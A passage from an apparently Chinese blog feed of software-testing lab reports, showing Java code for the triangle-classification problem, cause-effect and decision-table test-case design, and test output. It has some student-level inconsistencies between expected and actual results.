finished\n\n"</span>, tempSideC));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> stopFlag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!stopFlag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (verifyLengthRange(triangleProc.sideA) &amp;&amp; verifyLengthRange(triangleProc.sideB)</span><br><span class="line">                    &amp;&amp; verifyLengthRange(triangleProc.sideC)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (verifyFormPrinciple(triangleProc)) &#123;</span><br><span class="line">                    stopFlag = <span class="keyword">true</span>;</span><br><span class="line">                    String triangleType = judgeTriangleType(triangleProc);</span><br><span class="line">                    System.out.println(String.format(<span class="string">"你输入的三角形类型为：%1s"</span>, triangleType));</span><br><span class="line">                    System.out.println(<span class="string">"========The End========"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    inputEdge(scanner, triangleProc);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 边长不满足两个条件，重新输入</span></span><br><span class="line">                inputEdge(scanner, triangleProc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 主函数，同时也是测试函数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TriangleProc triangleProc = <span class="keyword">new</span> TriangleProc();</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        triangleProc.inputEdge(scanner, triangleProc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试用例设计"><a href="#测试用例设计" class="headerlink" title="测试用例设计"></a>测试用例设计</h2><h2 id="三角形问题：测试用例设计"><a href="#三角形问题：测试用例设计" class="headerlink" title="三角形问题：测试用例设计"></a>三角形问题：测试用例设计</h2><ol><li><p>分析（输入输出数据以及其逻辑关系）<br>因：<br>C1: 1&lt;=a&lt;=100<br>C2: 1&lt;=b&lt;=100<br>C3: 1&lt;=c&lt;=100<br>C4: a&lt;b+c<br>C5: b&lt;a+c<br>C6: c&lt;a+b<br>C7: a=b<br>C8: a=c<br>C9: b=c<br>果：<br>R1：等边三角形<br>R2：等腰 三角形<br>R3：不等边三角形<br>R4：非三角形<br>R5：不可能 </p></li><li><p>关联（不同组合间的关联、约束或限制条件，形成因果图）</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191231141825.png" style="zoom:50%;" />中间条件：M1: 满足边长要求M2: 构成三角形M3: 满足全部输入要求M4: 任意边长度相等M5: 存在一条边边长相等M6: 任意边边长都相等M7: 边长不构成三角形</li></ol><p>3.转换（因果图转换为决策表并简化）</p><table><thead><tr><th>条件</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th><th>12</th><th>13</th><th>14</th></tr></thead><tbody><tr><td>C1</td><td>F</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td></tr><tr><td>C2</td><td>-</td><td>F</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td></tr><tr><td>C3</td><td>-</td><td>-</td><td>F</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td></tr><tr><td>C4</td><td>-</td><td>-</td><td>-</td><td>F</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td></tr><tr><td>C5</td><td>-</td><td>-</td><td>-</td><td>-</td><td>F</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td></tr><tr><td>C6</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>F</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td></tr><tr><td>C7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>T</td><td>F</td><td>F</td><td>T</td><td>T</td><td>F</td><td>T</td><td>F</td></tr><tr><td>C8</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>F</td><td>T</td><td>F</td><td>T</td><td>F</td><td>T</td><td>T</td><td>F</td></tr><tr><td>C9</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>F</td><td>F</td><td>T</td><td>F</td><td>T</td><td>T</td><td>T</td><td>F</td></tr><tr><td>R1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>1</td><td></td></tr><tr><td>R2</td><td></td><td></td><td></td><td></td><td></td><td></td><td>1</td><td>1</td><td>1</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>R3</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>1</td></tr><tr><td>R4</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>R5</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>1</td><td>1</td><td>1</td><td></td><td></td></tr></tbody></table><p>因：<br>C1: 1&lt;=a&lt;=100<br>C2: 1&lt;=b&lt;=100<br>C3: 1&lt;=c&lt;=100<br>C4: a&lt;b+c<br>C5: b&lt;a+c<br>C6: c&lt;a+b<br>C7: a=b<br>C8: a=c<br>C9: b=c<br>果：<br>R1：等边三角形<br>R2：等腰 三角形<br>R3：不等边三角形<br>R4：非三角形<br>R5：不可能<br>R6：输入错误（// 忘记加了）</p><p>4.输出（从决策表生成测试用例）</p><table><thead><tr><th>用例ID</th><th>a</th><th>b</th><th>c</th><th>预期输出</th></tr></thead><tbody><tr><td>1</td><td>0</td><td>2</td><td>3</td><td>非三角形</td></tr><tr><td>2</td><td>2</td><td>0</td><td>3</td><td>非三角形</td></tr><tr><td>3</td><td>2</td><td>3</td><td>0</td><td>非三角形</td></tr><tr><td>4</td><td>1</td><td>0</td><td>0</td><td>非三角形</td></tr><tr><td>5</td><td>0</td><td>1</td><td>0</td><td>非三角形</td></tr><tr><td>6</td><td>0</td><td>0</td><td>1</td><td>非三角形</td></tr><tr><td>7</td><td>3</td><td>3</td><td>2</td><td>等腰三角形</td></tr><tr><td>8</td><td>3</td><td>2</td><td>3</td><td>等腰三角形</td></tr><tr><td>9</td><td>2</td><td>3</td><td>3</td><td>等腰三角形</td></tr><tr><td>10</td><td>?</td><td>?</td><td>?</td><td>不可能</td></tr><tr><td>11</td><td>?</td><td>?</td><td>?</td><td>不可能</td></tr><tr><td>12</td><td>?</td><td>?</td><td>?</td><td>不可能</td></tr><tr><td>13</td><td>3</td><td>3</td><td>3</td><td>等腰三角形</td></tr><tr><td>14</td><td>2</td><td>3</td><td>4</td><td>非等腰三角形</td></tr></tbody></table><h2 id="【测试代码及结果分析】"><a href="#【测试代码及结果分析】" class="headerlink" title="【测试代码及结果分析】"></a>【测试代码及结果分析】</h2><h3 id="三角形问题：测试代码"><a href="#三角形问题：测试代码" class="headerlink" title="三角形问题：测试代码"></a>三角形问题：测试代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.TriangleProc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TriangleTesting_fourth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkShape</span><span class="params">(<span class="keyword">int</span> sideA, <span class="keyword">int</span> sideB, <span class="keyword">int</span> sideC)</span> </span>&#123;</span><br><span class="line">        TriangleProc triangleProc = <span class="keyword">new</span> TriangleProc();</span><br><span class="line"></span><br><span class="line">        triangleProc.sideA = sideA;</span><br><span class="line">        triangleProc.sideB = sideB;</span><br><span class="line">        triangleProc.sideC = sideC;</span><br><span class="line"></span><br><span class="line">        triangleProc.verifyLengthRange(triangleProc.sideA);</span><br><span class="line">        triangleProc.verifyLengthRange(triangleProc.sideB);</span><br><span class="line">        triangleProc.verifyLengthRange(triangleProc.sideC);</span><br><span class="line"></span><br><span class="line">        triangleProc.verifyFormPrinciple(triangleProc);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"三角形类型为："</span> + triangleProc.judgeTriangleType(triangleProc));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        TriangleTesting_fourth triangleTesting_fourth = <span class="keyword">new</span> TriangleTesting_fourth();</span><br><span class="line"></span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">0</span>, <span class="number">0</span> ,<span class="number">1</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">"=====不可能====="</span>);</span><br><span class="line">        System.out.println(<span class="string">"=====不可能====="</span>);</span><br><span class="line">        System.out.println(<span class="string">"=====不可能====="</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">        triangleTesting_fourth.checkShape(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三角形问题：测试结果"><a href="#三角形问题：测试结果" class="headerlink" title="三角形问题：测试结果"></a>三角形问题：测试结果</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">边长 0 不满足大于等于1且小于等于 100</span><br><span class="line">边长组合为 0  2   3不满足两边之和大于第三边，是非三角形</span><br><span class="line">三角形类型为：非等边三角形</span><br><span class="line">边长 0 不满足大于等于1且小于等于 100</span><br><span class="line">边长组合为 2  0   3不满足两边之和大于第三边，是非三角形</span><br><span class="line">三角形类型为：非等边三角形</span><br><span class="line">边长 0 不满足大于等于1且小于等于 100</span><br><span class="line">边长组合为 2  3   0不满足两边之和大于第三边，是非三角形</span><br><span class="line">三角形类型为：非等边三角形</span><br><span class="line">边长 0 不满足大于等于1且小于等于 100</span><br><span class="line">边长 0 不满足大于等于1且小于等于 100</span><br><span class="line">边长组合为 1  0   0不满足两边之和大于第三边，是非三角形</span><br><span class="line">三角形类型为：等腰三角形</span><br><span class="line">边长 0 不满足大于等于1且小于等于 100</span><br><span class="line">边长 0 不满足大于等于1且小于等于 100</span><br><span class="line">边长组合为 0  1   0不满足两边之和大于第三边，是非三角形</span><br><span class="line">三角形类型为：等腰三角形</span><br><span class="line">边长 0 不满足大于等于1且小于等于 100</span><br><span class="line">边长 0 不满足大于等于1且小于等于 100</span><br><span class="line">边长组合为 0  0   1不满足两边之和大于第三边，是非三角形</span><br><span class="line">三角形类型为：等腰三角形</span><br><span class="line">边长组合满足两边之和大于第三边</span><br><span class="line">三角形类型为：等腰三角形</span><br><span class="line">边长组合满足两边之和大于第三边</span><br><span class="line">三角形类型为：等腰三角形</span><br><span class="line">边长组合满足两边之和大于第三边</span><br><span class="line">三角形类型为：等腰三角形</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;不可能&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;不可能&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;不可能&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">边长组合满足两边之和大于第三边</span><br><span class="line">三角形类型为：等边三角形</span><br><span class="line">边长组合满足两边之和大于第三边</span><br><span class="line">三角形类型为：非等边三角形</span><br></pre></td></tr></table></figure><p>满足实验预期</p><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><h3 id="基于因果图的黑盒测试方法的一般测试步骤"><a href="#基于因果图的黑盒测试方法的一般测试步骤" class="headerlink" title="基于因果图的黑盒测试方法的一般测试步骤"></a>基于因果图的黑盒测试方法的一般测试步骤</h3><ol><li>分析<br> 分析输入输出数据（因和果）<br> 分析输入输出数据的关系</li><li>关联<br> 不同组合间的关联、约束或限制条件，形成因果图</li><li>转换<br> 将因果图转换为决策表并进行简化</li><li>输出<br> 从决策表生成测试用例</li></ol><h3 id="因果图测试适用的范围"><a href="#因果图测试适用的范围" class="headerlink" title="因果图测试适用的范围"></a>因果图测试适用的范围</h3><p>通常适用于要产生大量决策的情况，或者输入变量之间存在重要逻辑关系。</p><p>1.决策表测试法适用于具有以下特征的应用程序</p><ul><li>程序的 if then else 逻辑突出</li><li>输入变量之间存在逻辑关系</li><li>计算过程涉及输入变量子集的处理</li><li>输入与输出之间存在因果关系</li><li>圈复杂度较高的应用</li></ul><p>2.适用于使用决策表设计测试用例的条件</p><ul><li>规格说明以决策表形式给出，或较容易转换为决策表</li><li>条件的排列顺序不会也不应影响执行的操作</li><li>规则的排列顺序不会也不应影响执行的操作</li><li>当某一规则的条件已经满足，并确定要执行的操作后，不必检验别的规则</li><li>如果某一规则的条件要执行多个操作，这些操作的执行顺序无关紧要</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
            <tag> 软件测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件工程】黑盒测试——基于决策表分析法</title>
      <link href="/2019/12/29//articles/2019/12/29/1577587291774.html/"/>
      <url>/2019/12/29//articles/2019/12/29/1577587291774.html/</url>
      
        <content type="html"><![CDATA[<h1 id="实验三-黑盒测试——基于决策表分析法"><a href="#实验三-黑盒测试——基于决策表分析法" class="headerlink" title="实验三 黑盒测试——基于决策表分析法"></a>实验三 黑盒测试——基于决策表分析法</h1><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191229104834.png"><br>图：封面</p><h2 id="开发语言及实现平台或实验环境"><a href="#开发语言及实现平台或实验环境" class="headerlink" title="开发语言及实现平台或实验环境"></a>开发语言及实现平台或实验环境</h2><p>在 Windows 7 或 Windows 10 操作系统上，使用 C，C++，C#或 Java 语言 及对应的开发环境(IDE)</p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ol><li>认识黑盒测试方法中基于决策表分析的测试方法原理  </li><li>掌握黑盒测试方法中基于决策表分析的测试方法过程</li></ol><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol><li>要求学生能够理解基于决策表的测试方法的相关概念、方法和过程  <del>~</del></li><li>具体为每一组，每组二——五人，根据实验题目编写出对应的 c 语言或c++语言程序，组间相互交换程序，按黑盒测试的方法进行测试。</li></ol><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>对编写的实验内容，采用基于决策表的测试方法进行黑盒测试。</p><h2 id="实验材料"><a href="#实验材料" class="headerlink" title="实验材料"></a>实验材料</h2><ol><li><p>三角形问题<br>问题描述:三角形问题接受三个整数，a、b 和 c 作为输入，用作三角<br>形的边。程序的输出是由这三条边确定的三角形类型:等边三角形、等腰 三角形、不等边三角形或非三角形。<br>作为输入:三角形的三条边必须满足如下条件: C1:1&lt;=a&lt;=100<br>C2:1&lt;=b&lt;=100<br>C3:1&lt;=c&lt;=100<br>C4:a&lt;b+c C5:b&lt;a+c C6:c&lt;a+b  </p></li><li><p>NextDate 函数<br>问题描述:NextDate 是一个由三个变量(月份、日期和年份)的函数。<br>函数返回输入日期后边的那个日期。 作为输入:变量月份、日期和年都具有整数值，满足以下条件。 C1:1&lt;=月份&lt;=12<br>C2:1&lt;=日期&lt;=31<br>C3:1912&lt;=年&lt;=2050</p></li></ol><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>预习相关课堂和实验内容，了解测试对象。</li><li>编写实验材料源代码。</li><li>划分等价类，设计测试用例。</li><li>根据问题需要建立桩模块和驱动模块。 </li><li>测试。</li><li>填写试验报告。</li></ol><h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><h3 id="三角形问题"><a href="#三角形问题" class="headerlink" title="三角形问题"></a>三角形问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> java.util.InputMismatchException;</span><br><span class="line">        <span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TriangleProc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideA = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideB = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TriangleProc</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：验证三角形边的长度范围</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> side</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verifyLengthRange</span><span class="params">(<span class="keyword">int</span> side)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((side &gt;= <span class="number">1</span>) &amp;&amp; (side &lt;= <span class="number">100</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"边长 %1d 不满足大于等于1且小于等于 100"</span>, side));</span><br><span class="line">            System.out.println(<span class="string">"=========请重新输入========="</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：验证三角形两边之和大于第三边</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> triangleProc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verifyFormPrinciple</span><span class="params">(TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((triangleProc.sideA + triangleProc.sideB &lt;= triangleProc.sideC)</span><br><span class="line">                || (triangleProc.sideA + triangleProc.sideC &lt;= triangleProc.sideB)</span><br><span class="line">                || (triangleProc.sideB + triangleProc.sideC &lt;= triangleProc.sideA)) &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"边长组合为 %1d %2d %3d不满足两边之和大于第三边，是非三角形"</span>,</span><br><span class="line">                    triangleProc.sideA, triangleProc.sideB, triangleProc.sideC));</span><br><span class="line">            System.out.println(<span class="string">"=========请重新输入========="</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"边长组合满足两边之和大于第三边"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">judgeTriangleType</span><span class="params">(TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (triangleProc.sideA == triangleProc.sideB || triangleProc.sideA == triangleProc.sideC</span><br><span class="line">                || triangleProc.sideB == triangleProc.sideC) &#123;</span><br><span class="line">            <span class="keyword">if</span> (triangleProc.sideA == triangleProc.sideB &amp;&amp; triangleProc.sideB == triangleProc.sideC) &#123;</span><br><span class="line">                String triangleType = <span class="string">"等边三角形"</span>;</span><br><span class="line">                <span class="keyword">return</span> triangleType;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String triangleType = <span class="string">"等腰三角形"</span>;</span><br><span class="line">                <span class="keyword">return</span> triangleType;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String triangleType = <span class="string">"非等边三角形"</span>;</span><br><span class="line">            <span class="keyword">return</span> triangleType;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inputEdge</span><span class="params">(Scanner scanner, TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tempSideA = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tempSideB = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tempSideC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println("Welcome to triangle judge program!!!d");</span></span><br><span class="line">        System.out.println(<span class="string">"Please input the side A"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            tempSideA = scanner.nextInt();</span><br><span class="line">            triangleProc.sideA = tempSideA;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge A is %1d. Please input side B"</span>, tempSideA));</span><br><span class="line">            tempSideB = scanner.nextInt();</span><br><span class="line">            triangleProc.sideB = tempSideB;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge B is %1d. Please input side C"</span>, tempSideB));</span><br><span class="line">            tempSideC = scanner.nextInt();</span><br><span class="line">            triangleProc.sideC = tempSideC;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge C is %1d. The input is finished\n\n"</span>, tempSideC));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> stopFlag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!stopFlag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (verifyLengthRange(triangleProc.sideA) &amp;&amp; verifyLengthRange(triangleProc.sideB)</span><br><span class="line">                    &amp;&amp; verifyLengthRange(triangleProc.sideC)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (verifyFormPrinciple(triangleProc)) &#123;</span><br><span class="line">                    stopFlag = <span class="keyword">true</span>;</span><br><span class="line">                    String triangleType = judgeTriangleType(triangleProc);</span><br><span class="line">                    System.out.println(String.format(<span class="string">"你输入的三角形类型为：%1s"</span>, triangleType));</span><br><span class="line">                    System.out.println(<span class="string">"========The End========"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    inputEdge(scanner, triangleProc);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; 